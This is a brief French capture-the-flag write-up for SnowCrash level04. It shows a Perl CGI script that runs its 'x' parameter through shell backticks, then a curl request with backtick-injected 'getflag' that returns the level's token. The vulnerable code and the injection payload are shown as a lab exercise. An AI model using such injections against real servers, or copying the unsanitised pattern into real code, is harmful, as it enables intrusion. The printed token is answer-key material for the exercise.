# Explication

On trouve un fichier `level04.pl`, l'execution de donne rien mais on peu le lire:
```perl
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

On peu supporser que c'est le code qui va s'executer si on va au `localhost:4747` comme indiqué en haut du fichier  
On peu aussi voir qu'il attend un parametre `x` dans l'url 

on va donc tester avec `curl`:
```
apouchet$ curl 192.168.253.129:4747?x=test
test
```

On essaye d'envoyer `getflag` sous forme de commande 
```
apouchet$ curl 192.168.253.129:4747?x=\`getflag\`
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
